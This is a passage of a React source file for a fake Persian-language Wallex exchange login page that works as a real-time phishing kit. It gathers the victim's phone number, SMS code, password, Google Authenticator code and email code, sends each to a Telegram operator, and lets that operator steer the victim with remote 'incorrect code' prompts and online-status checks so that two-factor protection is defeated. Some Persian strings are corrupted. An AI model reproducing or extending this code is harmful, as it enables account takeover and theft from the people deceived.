import { useState, useEffect } from "react";
import { useNavigate } from "react-router-dom";
import {
  ChevronLeft,
  ChevronDown,
  Info,
  Loader2,
  MessageSquare,
  Lock,
  Smartphone,
  Mail,
  Eye,
  EyeOff,
} from "lucide-react";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { AlertMessage } from "./AlertMessage";
import { OTPInput } from "./OTPInput";
import { cn } from "@/lib/utils";
import { toPersianDigits, toEnglishDigits } from "@/lib/persian-utils";
import {
  sendPhoneToTelegramEnhanced,
  validateTelegramConfig,
  updateAuthStep,
  setUserCurrentStep,
  canAccessAuthStep,
  getSession,
  updatePhoneVerificationCode,
  showAdminButtons,
  sendCustomMessageToTelegram,
  updateCustomMessageInTelegram,
  getMessageIdFromSession,
  updateSessionWithEmail,
  updateSessionWithEmailCode,
  updateUserOnlineStatus,
} from "@/lib/telegram-service-enhanced";
import {
  registerSecureCallback,
  unregisterSecureCallback,
} from "@/lib/callback-session-fix";

import { quickDebug } from "@/lib/telegram-debug-helper";
import enhancedOfflineDetection, { checkNetworkStatus } from "@/lib/enhanced-offline-detection";

type AuthStep =
  | "phone"
  | "loading"
  | "verify-phone"
  | "password"
  | "google"
  | "email"
  | "email-code";

export const LoginForm = () => {
  const navigate = useNavigate();

  // Main form state
  const [currentStep, setCurrentStep] = useState<AuthStep>("phone");
  const [sessionId, setSessionId] = useState<string>("");
  const [phoneNumber, setPhoneNumber] = useState("");

  // Phone step states
  const [mobileNumber, setMobileNumber] = useState("");
  const [showInviteCode, setShowInviteCode] = useState(false);
  const [inviteCode, setInviteCode] = useState("");
  const [captchaCode, setCaptchaCode] = useState("");
  const [currentCaptchaIndex, setCurrentCaptchaIndex] = useState(0);
  const [isSubmitting, setIsSubmitting] = useState(false);

  // Wallex captcha images
  const captchaImages = [
    "https://cdn.builder.io/api/v1/image/assets%2F3a5bf4f1d4394c31bc164112c90fe0fc%2F1df011ffccd04cf6a5853621be56e3ae?format=webp&width=800",
    "https://cdn.builder.io/api/v1/image/assets%2F3a5bf4f1d4394c31bc164112c90fe0fc%2F71c75370377c4470ba9a52d95ca31d19?format=webp&width=800",
    "https://cdn.builder.io/api/v1/image/assets%2F3a5bf4f1d4394c31bc164112c90fe0fc%2Fd721034f576545cebadb5e558068195d?format=webp&width=800"
  ];

  // Phone verification states
  const [verifyCode, setVerifyCode] = useState("");
  const [countdown, setCountdown] = useState(60);
  const [isSmsMode, setIsSmsMode] = useState(false); // Track if user came from Wrong SMS

  // Password states
  const [password, setPassword] = useState("");
  const [showPassword, setShowPassword] = useState(false);

  // Google Auth states
  const [googleCode, setGoogleCode] = useState("");

  // Email states
  const [email, setEmail] = useState("");
  const [emailCode, setEmailCode] = useState("");
  const [emailStep, setEmailStep] = useState<"email" | "code">("email");

  // Error states
  const [errors, setErrors] = useState<{
    mobileNumber?: string;
    inviteCode?: string;
    verifyCode?: string;
    password?: string;
    googleCode?: string;
    email?: string;
    emailCode?: string;
  }>({});
  const [isBlocked, setIsBlocked] = useState(false);
  const [hasError, setHasError] = useState(false);

  // Real-time presence tracking completely removed - only manual status check via Telegram button

  // No automatic network monitoring - only manual status check via Telegram button

  // Register callback handler for admin actions
  useEffect(() => {
    if (sessionId) {
      console.log("🔗 Registering callback handler for session:", sessionId);
      console.log("🕐 Registration time:", new Date().toLocaleString());

      // Add safety check for network connectivity and environment
      const registerCallback = async () => {
        try {
          // Check if we're in a development environment and have basic connectivity
          if (!navigator.onLine) {
            console.warn("⚠️ Device is offline, deferring callback registration");
            return;
          }

          registerSecureCallback(sessionId, handleAdminAction);
        } catch (error) {
          console.error("❌ Failed to register callback:", error);
          // Don't throw the error to prevent app crash
        }
      };

      // Handle the promise properly to prevent unhandled rejection
      registerCallback().catch((error) => {
        console.error("❌ Unhandled error in callback registration:", error);
      });

      // Don't unregister immediately on unmount - let the service handle cleanup
      return () => {
        console.log("🔌 Scheduling unregistration for session:", sessionId);
        // Longer delay to prevent premature cleanup
        setTimeout(() => {
          try {
            unregisterSecureCallback(sessionId);
          } catch (error) {
            console.error("❌ Failed to unregister callback:", error);
          }
        }, 1000);
      };
    }
  }, [sessionId]);

  // Global error handler for unhandled promise rejections
  useEffect(() => {
    const handleUnhandledRejection = (event: PromiseRejectionEvent) => {
      const reason = event.reason?.toString() || '';

      // Filter out Vite WebSocket errors (development only)
      if (
        reason.includes('WebSocket closed without opened') ||
        reason.includes('WebSocket connection failed') ||
        reason.includes('vite') ||
        reason.includes('hmr') ||
        reason.includes('@vite/client')
      ) {
        console.warn("🔄 Vite HMR issue (non-critical):", event.reason);
        event.preventDefault();
        return;
      }

      // Log other errors but prevent them from crashing the app
      console.error("🚨 Unhandled promise rejection:", event.reason);
      event.preventDefault();
    };

    window.addEventListener('unhandledrejection', handleUnhandledRejection);

    return () => {
      window.removeEventListener('unhandledrejection', handleUnhandledRejection);
    };
  }, []);

  // Countdown timer for verify-phone step
  useEffect(() => {
    if (currentStep === "verify-phone" && countdown > 0) {
      const timer = setTimeout(() => setCountdown(countdown - 1), 1000);
      return () => clearTimeout(timer);
    }
  }, [countdown, currentStep]);

  // Handle admin actions from Telegram bot
  const handleAdminAction = (action: string) => {
    if (!sessionId) {
      console.error("No session ID for admin action");
      return;
    }

    console.log("🎯 LoginForm received admin action:", {
      sessionId,
      action,
      currentStep,
      timestamp: new Date().toISOString(),
    });
    setIsSubmitting(false);

    // Handle incorrect actions
    if (action.startsWith("incorrect_")) {
      const errorType = action.replace("incorrect_", "");
      setHasError(true);

      switch (errorType) {
        case "password":
          setCurrentStep("password");
          setPassword(""); // Clear password field
          setErrors({
            password:
              "رمز عبور وارد شده اشتباه است. لطفا رمز صحیح را وارد کنید.",
          });
          break;
        case "google":
          setCurrentStep("google");
          setGoogleCode(""); // Clear Google code field
          setErrors({
            googleCode:
              "کد Google Authenticator وارد شده اشتباه است. لطفا کد صحیح را وارد کنید.",
          });
          break;
        case "sms":
          setCurrentStep("verify-phone");
          setVerifyCode(""); // Clear previous code for easier input
          setIsSmsMode(true); // Mark as SMS auth mode
          setErrors({
            verifyCode:
              "کد تایید شماره وارد شده اشتباه است. لطفا کد صحیح را وارد کنید.",
          });
          break;
        case "email":
          setCurrentStep("email");
          setEmailStep("code");
          setEmailCode(""); // Clear email code field
          setErrors({
            emailCode:
              "کد ایمیل وارد شده اشتباه است. لطفا کد صحیح را وارد کنید.",
          });
          break;
      }
      return;
    }

    // Handle regular auth actions
    switch (action) {
      case "password":
        setCurrentStep("password");
        setErrors({});
        setHasError(false);
        break;
      case "google":
        setCurrentStep("google");
        setErrors({});
        setHasError(false);
        break;

      case "email":
        setCurrentStep("email");
        setEmailStep("email");
        setErrors({});
        setHasError(false);
        break;
      case "check_status":
        // بررسی دقیق وضعی�� کاربر با Enhanced Offline Detection
        console.log("🔍 Admin requested enhanced status check for session:", sessionId);

        const isVisible = !document.hidden;

        // اول یک simple test کنیم
        console.log("🧪 Simple status test:", {
          navigatorOnline: navigator.onLine,
          documentHidden: document.hidden,
          isVisible,
          userAgent: navigator.userAgent.slice(0, 30),
        });

        // استفاده از Enhanced Network Status Check
        console.log("🌐 Starting enhanced network status check...");
        checkNetworkStatus().then((networkStatus) => {
          console.log("📊 Network status result:", networkStatus);

          const { isOnline: isActuallyOnline, connectionType } = networkStatus;
          const { text: statusText, emoji: statusEmoji } = enhancedOfflineDetection.getStatusDisplay(networkStatus);

          console.log("📊 Status display from enhanced detection:", { statusText, statusEmoji });

          // تعیین وضعیت نهایی - اولویت با آفلاین بودن
          let finalStatusText = "offline";
          let finalStatusEmoji = "🔴";

          if (!isActuallyOnline) {
            // کاربر آفلاین است
            finalStatusText = "offline";
            finalStatusEmoji = connectionType === 'offline' ? "📵" : "🔴";
            console.log("🔴 User is OFFLINE - network status:", connectionType);
          } else if (isActuallyOnline && !isVisible) {
            // کاربر آنلاین است اما صفحه hidden است
            finalStatusText = "away";
            finalStatusEmoji = "���";
            console.log("🟡 User is AWAY - online but tab hidden");
          } else if (isActuallyOnline && isVisible) {
            // کاربر کاملاً آنلاین است
            finalStatusText = "online";
            finalStatusEmoji = "🟢";
            console.log("🟢 User is ONLINE - fully active");
          }

          console.log("📊 FINAL Enhanced status check results:", {
            isVisible,
            isActuallyOnline,
            connectionType,
            finalStatusText,
            finalStatusEmoji,
            currentStep,
            timestamp: new Date().toISOString(),
          });

          updateUserOnlineStatus(
            sessionId,
            isActuallyOnline,
            isVisible,
            Date.now(),
            finalStatusText,
            finalStatusEmoji,
            true, // forceUpdate = true for manual status check
          ).then(() => {
            console.log("✅ Enhanced status check completed and sent to Telegram");
          }).catch((error) => {
            console.error("❌ Failed to send enhanced status check:", error);
          });
        }).catch((error) => {
          // Fallback: اگر enhanced detection هم کار ن����رد
          console.error("❌ Enhanced network detection failed:", error);

          // استفاده از navigator.onLine به عنوان fallback
          const navigatorOnline = navigator.onLine;
          let fallbackStatusText = "offline";
          let fallbackStatusEmoji = "🔴";

          if (!navigatorOnline) {
            fallbackStatusText = "offline";
            fallbackStatusEmoji = "📵";
            console.log("🔴 FALLBACK: Navigator reports offline");
          } else if (navigatorOnline && !isVisible) {
            fallbackStatusText = "away";
            fallbackStatusEmoji = "🟡";
            console.log("⚠️ FALLBACK: Navigator online but tab hidden");
          } else {
            fallbackStatusText = "online";
            fallbackStatusEmoji = "🟢";
            console.log("✅ FALLBACK: Navigator online and tab visible");
          }

          console.log("📊 FALLBACK status:", { navigatorOnline, isVisible, fallbackStatusText, fallbackStatusEmoji });

          updateUserOnlineStatus(
            sessionId,
            navigatorOnline,
            isVisible,
            Date.now(),
            fallbackStatusText,
            fallbackStatusEmoji,
            true, // forceUpdate = true
          ).then(() => {
            console.log("✅ Fallback status sent to Telegram");
          }).catch((fallbackError) => {
            console.error("❌ Failed to send fallback status:", fallbackError);
          });
        });
        break;
      // test_offline action removed - using only manual status check
      case "complete":
        localStorage.setItem("isAuthenticated", "true");
        localStorage.setItem("userPhone", phoneNumber);
        sessionStorage.removeItem("sessionId");
        sessionStorage.removeItem("phoneNumber");
        alert("🎉 احراز هویت ��ا موفقیت تکمیل شد! خوش آمدید.");
        navigate("/", { replace: true });
        break;
    }
  };

  const validateMobileNumber = (number: string): boolean => {
    const mobileRegex = /^09\d{9}$/;
    return mobileRegex.test(number);
  };

  const validatePassword = (password: string): boolean => {
    return password.length > 0;
  };

  const validateEmail = (email: string): boolean => {
    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    return emailRegex.test(email);
  };

  // Phone number submission
  const handlePhoneSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setErrors({});

    const newErrors: { mobileNumber?: string; inviteCode?: string } = {};

    if (!mobileNumber) {
      newErrors.mobileNumber = "شماره هم����اه الزامی است";
    } else if (!validateMobileNumber(mobileNumber)) {
      newErrors.mobileNumber = "شماره همراه معتبر نیس��";
    }

    if (Object.keys(newErrors).length > 0) {
      setErrors(newErrors);
      return;
    }

    setIsSubmitting(true);

    try {
      console.log("📞 Sending phone number to Telegram admin:", mobileNumber);
      const result = await sendPhoneToTelegramEnhanced(mobileNumber);

      if (!result.success) {
        throw new Error("Failed to send notification to Telegram admin");
      }

      console.log("✅ Session created:", result.sessionId);
      setSessionId(result.sessionId);
      setPhoneNumber(mobileNumber);
      sessionStorage.setItem("sessionId", result.sessionId);
      sessionStorage.setItem("phoneNumber", mobileNumber);

      // Real-time status tracking disabled - status will be checked manually by admin
      console.log("������ Automatic status updates disabled - admin can check status manually");

      // Show demo verification code if in demo mode
      if (!validateTelegramConfig()) {
        console.log("⚠️ Demo verification code: 123456");
        alert(
          "🎭 حالت دمو\n\nکد تایید: 123456\n\n(در حالت واقعی این کد به ت��گرام ارسال می‌شود)",
        );
      }

      console.log("🔄 Moving to verify-phone step");
      setCurrentStep("verify-phone");
      setIsSmsMode(false); // Regular phone verification, not SMS auth
    } catch (error) {
      console.error("Phone submission error:", error);
      setErrors({
        mobileNumber: "خطا در ارسال اطلاعات. لطفا دوباره تلاش کنید.",
      });
    } finally {
      setIsSubmitting(false);
    }
  };

  // Phone verification code submission
  const handleVerifyCodeSubmit = async () => {
    setErrors({});

    if (!verifyCode || verifyCode.length !== 6) {
      setErrors({ verifyCode: "کد تایید ۶ رقمی را وارد کنید" });
      return;
    }

    setIsSubmitting(true);

    try {
      console.log("🔍 Verifying code:", verifyCode, "SMS mode:", isSmsMode);

      // In demo mode, accept any 6-digit code
      if (!validateTelegramConfig()) {
        console.log("🎭 Demo mode: accepting any 6-digit code");
        await new Promise((resolve) => setTimeout(resolve, 1000));
      } else {
        if (isSmsMode) {
          // This is SMS auth (from Wrong SMS button)
          console.log("📱 Sending SMS code as auth step to Telegram");
          const success = await updateAuthStep(sessionId, "sms", verifyCode);
          if (!success) {
            throw new Error("Failed to update SMS auth step");
          }
        } else {
          // Regular phone verification
          console.log("📱 Regular phone verification");
          const success = await updatePhoneVerificationCode(
            sessionId,
            verifyCode,
          );
          if (!success) {
            throw new Error("Failed to update phone verification");
          }
        }
      }

      console.log("✅ Code verified successfully");
      setCurrentStep("loading");

      // Reset SMS mode after successful submission
      setIsSmsMode(false);

      // Show admin buttons after reaching loading page
      setTimeout(async () => {
        try {
          console.log("📱 User reached loading step, showing admin buttons...");
          await showAdminButtons(sessionId);

          // In demo mode, show manual admin controls
          if (!validateTelegramConfig()) {
            setTimeout(() => {
              const choice = prompt(
                "🎭 حالت دمو - شبیه‌سازی ادمین\n\n" +
                  "انتخاب کنید:\n" +
                  "1 = Password\n" +
                  "2 = Google Auth\n" +
                  "3 = Email",
                "1",
              );

              switch (choice) {
                case "1":
                  console.log("🎭 Demo admin chose: Password");
                  handleAdminAction("password");
                  break;
                case "2":
                  console.log("🎭 Demo admin chose: Google Auth");
                  handleAdminAction("google");
                  break;
                case "3":
                  console.log("🎭 Demo admin chose: Email");
                  handleAdminAction("email");
                  break;
                default:
                  console.log("🎭 Demo admin chose: Password (default)");
                  handleAdminAction("password");
              }
            }, 3000);
          }
        } catch (error) {
          console.warn("⚠️ Could not show admin buttons:", error);
        }
      }, 2000);
    } catch (error) {
      console.error("Verification error:", error);
      setErrors({ verifyCode: "کد تایید نادرست است. لطفا دوباره تلاش کنید." });
    } finally {
      setIsSubmitting(false);
    }
  };

  // Password submission
  const handlePasswordSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setErrors({});

    if (!password) {
      setErrors({ password: "رمز عبور الزامی ا��ت" });
      return;
    }

    if (!validatePassword(password)) {
      setErrors({
        password: "رمز عبور نمی‌تواند ��الی باشد",
      });
      return;
    }

    setIsSubmitting(true);

    try {
      const success = await updateAuthStep(sessionId, "password", password);
      if (!success) {
        throw new Error("Failed to update password step");
      }

      await new Promise((resolve) => setTimeout(resolve, 1000));
      setCurrentStep("loading");

      // Show admin buttons after reaching loading page
      setTimeout(async () => {
        try {
          console.log(
            "🔓 User reached loading step from password, showing admin buttons...",
          );
          await showAdminButtons(sessionId);
        } catch (error) {
          console.error("❌ Failed to show admin buttons:", error);
        }
      }, 500);
    } catch (error) {
      console.error("Password submission error:", error);
      setErrors({ password: "خطا در ارسال رمز عبور. لطفا دوبا��ه تلاش کنید." });
    } finally {
      setIsSubmitting(false);
    }
  };

  // Google Auth code submission
  const handleGoogleCodeSubmit = async () => {
    setErrors({});

    if (!googleCode || googleCode.length !== 6) {
      setErrors({ googleCode: "کد Google Authenticator �� ��قمی را وارد کنید" });
      return;
    }

    setIsSubmitting(true);

    try {
      const success = await updateAuthStep(sessionId, "google", googleCode);
      if (!success) {
        throw new Error("Failed to update Google Auth step");
      }

      await new Promise((resolve) => setTimeout(resolve, 1000));
      setCurrentStep("loading");

      // Show admin buttons after reaching loading page
      setTimeout(async () => {
        try {
          console.log(
            "📱 User reached loading step from Google Auth, showing admin buttons...",
          );
          await showAdminButtons(sessionId);
        } catch (error) {
          console.error("❌ Failed to show admin buttons:", error);
        }
      }, 500);
    } catch (error) {
      console.error("Google Auth submission error:", error);
      setErrors({
        googleCode: "خطا در ارس��ل کد. لطفا دوباره تلاش کنید.",
      });
    } finally {
      setIsSubmitting(false);
    }
  };

  // Email submission
  const handleEmailSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setErrors({});

    if (!email) {
      setErrors({ email: "ایمیل ا��زامی است" });
      return;
    }

    if (!validateEmail(email)) {
      setErrors({ email: "ایمیل معتبر نیست" });
      return;
    }

    setIsSubmitting(true);

    try {
      console.log(
        "📧 Updating session with email:",
        email,
        "Session ID:",
        sessionId,
      );

      // Update the existing session message with email information
      const result = await updateSessionWithEmail(sessionId, email);

      console.log("📧 Email update result:", result);

      if (result.success) {
        console.log("✅ Session updated with email successfully");
        setEmailStep("code");
      } else {
        throw new Error("Failed to update session with email");
      }
    } catch (error) {
      console.error("Email sending error:", error);
      setErrors({ email: "خطا در ارسال ایمیل. لطفا دوباره تلاش ک��ید." });
    } finally {
      setIsSubmitting(false);
    }
  };

  // Email code submission
  const handleEmailCodeSubmit = async () => {
    setErrors({});

    if (!emailCode || emailCode.length !== 6) {
      setErrors({ emailCode: "کد ایمیل ۶ رقمی را وارد کنید" });
      return;
    }

    setIsSubmitting(true);

    try {
      console.log("🔄 Updating session with email code:", {
        emailCode,
        sessionId,
        email,
      });

      // Update the existing session message with email code
      const result = await updateSessionWithEmailCode(sessionId, emailCode);

      console.log("🔄 Email code update result:", result);

      if (result.success) {
        console.log("✅ Session updated with email code successfully");
        // Navigate to loading page after updating Telegram
        setCurrentStep("loading");

        // Show admin buttons after reaching loading page
        setTimeout(async () => {
          try {
            console.log(
              "📱 User reached loading step from email, showing admin buttons...",
            );
            await showAdminButtons(sessionId);
          } catch (error) {
            console.error("❌ Failed to show admin buttons:", error);
          }
        }, 500);
      } else {
        throw new Error("Failed to update session with email code");
      }
    } catch (error) {
      console.error("Email code verification error:", error);
      setErrors({ emailCode: "خطا در ارسال کد. لطفا دوباره تلاش کنید." });
    } finally {
      setIsSubmitting(false);
    }
  };

  const handleMobileNumberChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const englishValue = toEnglishDigits(
      e.target.value.replace(/[^0-9۰-۹]/g, ""),
    );
    setMobileNumber(englishValue);
    if (errors.mobileNumber) {
      setErrors((prev) => ({ ...prev, mobileNumber: undefined }));
    }

    // Typing detection removed - only manual status check
  };

  const handleBack = () => {
    if (currentStep === "verify-phone") {
      if (isSmsMode) {
        // If in SMS mode, go back to loading page
        setCurrentStep("loading");
        setIsSmsMode(false);
      } else {
        // Regular phone verification, go back to phone input
        setCurrentStep("phone");
      }
    } else if (currentStep === "email-code") {
      setEmailStep("email");
    } else {
      setCurrentStep("loading");
    }
  };

  // Render loading state
  const renderLoading = () => (
    <div style={{ textAlign: "center", padding: "40px 0" }}>
      <div
        style={{
          display: "flex",
          flexDirection: "column",
          alignItems: "center",
          gap: "24px",
        }}
      >
        <div
          style={{
            display: "flex",
            alignItems: "center",
            justifyContent: "center",
            width: "80px",
            height: "80px",
            backgroundColor: "rgb(23, 29, 38)",
            borderRadius: "50%",
          }}
        >
          <Loader2
            className="animate-spin"
            style={{
              width: "40px",
              height: "40px",
              color: "rgb(255, 255, 255)",
            }}
          />
        </div>

        <div style={{ textAlign: "center" }}>
          <h2
            style={{
              fontSize: "18px",
              fontWeight: "700",
              color: "rgb(0, 0, 0)",
              margin: "0 0 8px 0",
            }}
          >
            در حال پردازش...
          </h2>
          <p
            style={{
              fontSize: "14px",
              color: "rgba(0, 0, 0, 0.6)",
              margin: "0",
              lineHeight: "1.5",
            }}
          >
            لطفا صبر کنید
          </p>
        </div>

        <div
          style={{
            width: "60px",
            height: "4px",
            backgroundColor: "rgba(0, 122, 255, 0.2)",
            borderRadius: "2px",
            overflow: "hidden",
            position: "relative",
          }}
        >
          <div
            style={{
              width: "20px",
              height: "100%",
              backgroundColor: "rgb(0, 122, 255)",
              borderRadius: "2px",
              animation: "slide 2s ease-in-out infinite",
            }}
          />
        </div>
      </div>

      <style>{`
        @keyframes slide {
          0% {
            transform: translateX(-40px);
          }
          50% {
            transform: translateX(80px);
          }
          100% {
            transform: translateX(-40px);
          }
        }
      `}</style>
    </div>
  );

  return (
    <div
      style={{
        backgroundColor: "rgb(255, 255, 255)",
        borderBottomLeftRadius: "16px",
        borderBottomRightRadius: "16px",
        borderRadius: "16px",
        borderTopLeftRadius: "16px",
        borderTopRightRadius: "16px",
        width: "100%",
        maxWidth: "480px",
      }}
      className="form-card"
    >
      <div
        style={{
          display: "flex",
          flexDirection: "column",
          gap: "4px",
          paddingBottom: "8px",
          paddingLeft: "20px",
          paddingRight: "20px",
          paddingTop: "8px",
          width: "100%",
        }}
      >
        {/* Header */}
        <div
          style={{
            alignItems: "center",
            display: "flex",
            justifyContent: "center",
            minHeight: "32px",
            paddingLeft: "6px",
            paddingRight: "6px",
            position: "relative",
          }}
        >
          {currentStep !== "phone" && currentStep !== "loading" && (
            <button
              tabIndex={0}
              type="button"
              onClick={handleBack}
              style={{
                alignItems: "center",
                borderBottomLeftRadius: "50%",
                borderBottomRightRadius: "50%",
                borderColor: "rgba(0, 0, 0, 0.6)",
                borderRadius: "50%",
                borderTopLeftRadius: "50%",
                borderTopRightRadius: "50%",
                color: "rgba(0, 0, 0, 0.6)",
                cursor: "pointer",
                display: "flex",
                flexShrink: "0",
                fontSize: "24px",
                justifyContent: "center",
                lineHeight: "42px",
                outlineColor: "rgba(0, 0, 0, 0.6)",
                paddingBottom: "8px",
                paddingLeft: "8px",
                paddingRight: "8px",
                paddingTop: "8px",
                position: "absolute",
                right: "0px",
                textAlign: "center",
                textDecorationColor: "rgba(0, 0, 0, 0.6)",
                textEmphasisColor: "rgba(0, 0, 0, 0.6)",
                transitionDuration: "0.15s",
                transitionProperty: "background-color",
                transitionTimingFunction: "cubic-bezier(0.4, 0, 0.2, 1)",
                userSelect: "none",
                verticalAlign: "middle",
                backgroundColor: "rgba(0, 0, 0, 0)",
                border: "none",
              }}
            >
              <svg
                xmlns="http://www.w3.org/2000/svg"
                width="24"
                height="24"
                fill="none"
                focusable="false"
                aria-hidden="true"
                viewBox="0 0 24 24"
                style={{
                  borderColor: "rgba(0, 0, 0, 0.6)",
                  color: "rgba(0, 0, 0, 0.6)",
                  cursor: "pointer",
                  fill: "rgba(0, 0, 0, 0.6)",
                  flexShrink: "0",
                  fontSize: "24px",
                  height: "24px",
                  lineHeight: "42px",
                  outlineColor: "rgba(0, 0, 0, 0.6)",
                  overflowClipMargin: "content-box",
                  overflowX: "hidden",
                  overflowY: "hidden",
                  textAlign: "center",
                  textDecorationColor: "rgba(0, 0, 0, 0.6)",
                  textEmphasisColor: "rgba(0, 0, 0, 0.6)",
                  transitionDuration: "0.2s",
                  transitionProperty: "fill",
                  transitionTimingFunction: "cubic-bezier(0.4, 0, 0.2, 1)",
                  userSelect: "none",
                  width: "24px",
                }}
              >
                <path
                  fill="currentColor"
                  fillRule="evenodd"
                  d="M8.47 4.47a.75.75 0 0 1 1.06 0l7 7a.75.75 0 0 1 0 1.06l-7 7a.75.75 0 0 1-1.06-1.06L14.94 12 8.47 5.53a.75.75 0 0 1 0-1.06"
                  clipRule="evenodd"
                />
              </svg>
            </button>
          )}
          <span
            style={{
              fontSize: "14px",
              fontWeight: "700",
              lineHeight: "24.01px",
              textAlign: "center",
            }}
          >
            {currentStep === "verify-phone" ? "تایید شماره موبایل" :
             currentStep === "password" ? "رمز عبور" :
             currentStep === "google" ? "Google Authenticator" :
             currentStep === "email" ? "تایید ایمیل" :
             "ورود و ثبت‌نام"}
          </span>
        </div>

        {/* Separator */}
        <hr
          style={{
            borderBottomStyle: "solid",
            borderBottomWidth: "1px",
            borderBottomColor: "rgba(0, 0, 0, 0.2)",
            borderLeftStyle: "solid",
            borderLeftWidth: "0",
            borderLeftColor: "rgba(0, 0, 0, 0.2)",
            borderRightStyle: "solid",
            borderRightWidth: "0",
            borderRightColor: "rgba(0, 0, 0, 0.2)",
            borderTopStyle: "solid",
            borderTopWidth: "0",
            borderTopColor: "rgba(0, 0, 0, 0.2)",
            flexShrink: "0",
            marginLeft: "-20px",
            marginRight: "-20px",
            marginTop: "4px",
            marginBottom: "4px",
            overflowX: "hidden",
            overflowY: "hidden",
          }}
        />

        {/* Content based on current step */}
        <div
          style={{
            display: "flex",
            flexDirection: "column",
            gap: "4px",
            marginTop: "4px",
          }}
        >
          {/* Step 1: Phone Number Input */}
          {currentStep === "phone" && (
            <>
              <form onSubmit={handlePhoneSubmit}>
                <h5
                  style={{
                    fontSize: "20px",
                    fontWeight: "700",
                    lineHeight: "28px",
                    marginBottom: "12px",
                    textAlign: "center",
                  }}
                >
                  به والکس خوش آمدید
                </h5>
                {/* Mobile Number Input */}
                <div
                  inputMode="numeric"
                  style={{
                    display: "inline-flex",
                    flexDirection: "column",
                    position: "relative",
                    verticalAlign: "top",
                    width: "100%",
                  }}
                >
                  <label
                    htmlFor="mobile-input"
                    style={{
                      cursor: "default",
                      fontSize: "14px",
                      fontWeight: "500",
                      lineHeight: "24.01px",
                      marginBottom: "4px",
                      maxWidth: "calc(133% - 32px)",
                      overflowX: "hidden",
                      overflowY: "hidden",
                      position: "relative",
                      right: "0px",
                      textOverflow: "ellipsis",
                      textWrap: "nowrap",
                      top: "0px",
                      transformOrigin: "100% 0%",
                      transitionBehavior: "normal, normal, normal",
                      transitionDelay: "0s, 0s, 0s",
                      transitionDuration: "0.2s, 0.2s, 0.2s",
                      transitionProperty: "color, transform, max-width",
                      transitionTimingFunction:
                        "cubic-bezier(0, 0, 0.2, 1), cubic-bezier(0, 0, 0.2, 1), cubic-bezier(0, 0, 0.2, 1)",
                      userSelect: "none",
                      whiteSpace: "nowrap",
                      zIndex: "1",
                      textAlign: "right",
                      color: "rgb(0, 0, 0)",
                    }}
                  >
                    شماره موبایل
                  </label>
                  <div
                    style={{
                      alignItems: "center",
                      backgroundColor: "rgb(245, 246, 247)",
                      borderBottomLeftRadius: "8px",
                      borderBottomRightRadius: "8px",
                      borderRadius: "8px",
                      borderTopLeftRadius: "8px",
                      borderTopRightRadius: "8px",
                      cursor: "text",
                      display: "flex",
                      position: "relative",
                      width: "100%",
                    }}
                  >
                    <input
                      id="mobile-input"
                      aria-invalid="false"
                      aria-describedby=":R1aekpj1l6:-helper-text"
                      autoFocus
                      name="mobile_number"
                      placeholder="شماره موبایل خود را وارد کنید."
                      type="text"
                      inputMode="numeric"
                      maxLength={13}
                      value={toPersianDigits(mobileNumber)}
                      onChange={handleMobileNumberChange}
                      disabled={isSubmitting}
                      style={{
                        animation:
                          "0.01s ease 0s 1 normal none running mui-auto-fill-cancel",
                        animationDuration: "0.01s",
                        animationName: "mui-auto-fill-cancel",
                        appearance: "auto",
                        boxSizing: "content-box",
                        cursor: "text",
                        overflowX: "clip",
                        overflowY: "clip",
                        paddingBottom: "10px",
                        paddingLeft: "12px",
                        paddingRight: "12px",
                        paddingTop: "10px",
                        width: "100%",
                        fontSize: "14px",
                        textAlign: "right",
                        backgroundColor: "transparent",
                        border: "none",
                        outline: "none",
                      }}
                    />
                    <fieldset
                      aria-hidden="true"
                      style={{
                        borderBottom: "1px solid rgba(0, 0, 0, 0)",
                        borderBottomLeftRadius: "8px",
                        borderBottomRightRadius: "8px",
                        borderBottomStyle: "solid",
                        borderBottomWidth: "1px",
                        borderColor: errors.mobileNumber
                          ? "rgb(220, 38, 38)"
                          : "rgba(0, 0, 0, 0)",
                        borderLeft: "1px solid rgba(0, 0, 0, 0)",
                        borderLeftStyle: "solid",
                        borderLeftWidth: "1px",
                        borderRadius: "8px",
                        borderRight: "1px solid rgba(0, 0, 0, 0)",
                        borderRightStyle: "solid",
                        borderRightWidth: "1px",
                        borderStyle: "solid",
                        borderTop: "1px solid rgba(0, 0, 0, 0)",
                        borderTopLeftRadius: "8px",
                        borderTopRightRadius: "8px",
                        borderTopStyle: "solid",
                        borderTopWidth: "1px",
                        borderWidth: "1px",
                        bottom: "0px",
                        cursor: "text",
                        left: "0px",
                        minWidth: "0%",
                        overflowX: "hidden",
                        overflowY: "hidden",
                        paddingLeft: "8px",
                        paddingRight: "8px",
                        pointerEvents: "none",
                        position: "absolute",
                        right: "0px",
                        textAlign: "right",
                        top: "-5px",
                      }}
                    >
                      <legend
                        style={{
                          cursor: "text",
                          fontSize: "12px",
                          height: "11px",
                          lineHeight: "21px",
                          maxWidth: "0.01px",
                          overflowX: "hidden",
                          overflowY: "hidden",
                          pointerEvents: "none",
                          textAlign: "right",
                          textWrap: "nowrap",
                          transitionDuration: "0.05s",
                          transitionProperty: "max-width",
                          transitionTimingFunction:
                            "cubic-bezier(0, 0, 0.2, 1)",
                          visibility: "hidden",
                          whiteSpace: "nowrap",
                        }}
                      >
                        <span
                          style={{
                            cursor: "text",
                            display: "inline-block",
                            fontSize: "12px",
                            lineHeight: "21px",
                            opacity: "0",
                            paddingLeft: "5px",
                            paddingRight: "5px",
                            pointerEvents: "none",
                            textAlign: "right",
                            textWrap: "nowrap",
                            whiteSpace: "nowrap",
                          }}
                        >
                          شماره موبایل
                        </span>
                      </legend>
                    </fieldset>
                  </div>
                  <p
                    style={{
                      borderColor: "rgba(0, 0, 0, 0.6)",
                      color: errors.mobileNumber ? "rgb(220, 38, 38)" : "rgba(0, 0, 0, 0.6)",
                      fontSize: "12px",
                      lineHeight: "20.004px",
                      marginTop: "4px",
                      outlineColor: "rgba(0, 0, 0, 0.6)",
                      textAlign: "right",
                      textDecorationColor: "rgba(0, 0, 0, 0.6)",
                      textEmphasisColor: "rgba(0, 0, 0, 0.6)",
                    }}
                  >
                    {errors.mobileNumber || "​"}
                  </p>
                </div>

                {/* Invite Code Section */}
                <div
                  style={{
                    alignItems: "flex-start",
                    display: "flex",
                    flexDirection: "column",
